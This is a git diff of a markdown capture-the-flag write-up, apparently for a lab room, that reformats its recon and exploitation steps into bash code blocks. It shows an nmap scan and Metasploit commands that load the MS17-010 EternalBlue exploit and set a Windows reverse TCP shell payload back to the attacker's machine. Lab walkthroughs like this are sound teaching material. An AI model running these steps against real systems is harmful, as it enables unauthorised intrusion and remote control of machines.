@@ -28,7 +28,7 @@ Firstly, let’s start the target machine and give it a few minutes to start all
 First start with a straightforward nmap scan to see which ports are open and what possible path exists into the target machine.  
 
 Run nmap via the following 
-```shell  
+```bash  
 sudo nmap -sS TARGET_IP
 ```   
 #### ⚙️ **Options**  
@@ -71,22 +71,37 @@ This concludes the required Reconnaissance for the room and now move on to gain 
 ## 🛠️ Gain Access: 
 In the Recon section it was identified that the target machine is vulnerable to MS17_010 aka EternalBlue. 
 
-So, let’s start up Metasploit using ```msfconsole```  
+So, let’s start up Metasploit using
+```bash
+msfconsole
+```  
 
-Now let’s see if there are any relevant modules available to us via ```search ms17-010``` this will bring back the below results.  
+Now let’s see if there are any relevant modules available to us via 
+```bash
+search ms17-010
+``` 
+this will bring back the below results.  
 ![Gain Access - search](./Images/Gain%20Access%20-%20search.png)  
-In this instance use the first result, to load this module type ```use 0```  
+In this instance use the first result, to load this module type 
+```bash
+use 0
+```  
 
 This will also now provide us with the answer to the first question in this section: **Find the exploitation code we will run against the machine. What is the full path of the code?**  
 
-Now that the module is loaded the options need to be configured. Firstly, let’s view the options via ```show options```  
+Now that the module is loaded the options need to be configured. Firstly, let’s view the options via 
+```bash
+show options
+```  
 ![Gain Access - Initial options](./Images/Gain%20Access%20-%20Initial%20options.png)  
 The items that need to be changed are **RHOSTS**, **LHOST** and the **Payload**  Noting that only the **RHOSTS** is empty and required to be set for the module. The **LHOST** is part of the payload options.  
 
 Do this via the following commands  
-```set RHOSTS TARGET_IP```  
-```set LHOST YOUR_MACHINE_IP```  
-```set payload windows/x64/shell/reverse_tcp```  
+```bash
+set RHOSTS TARGET_IP  
+set LHOST YOUR_MACHINE_IP  
+set payload windows/x64/shell/reverse_tcp
+```  
 
 This should give you the information to answer the next question: **Show options and set the one required value. What is the name of this value?**  
 
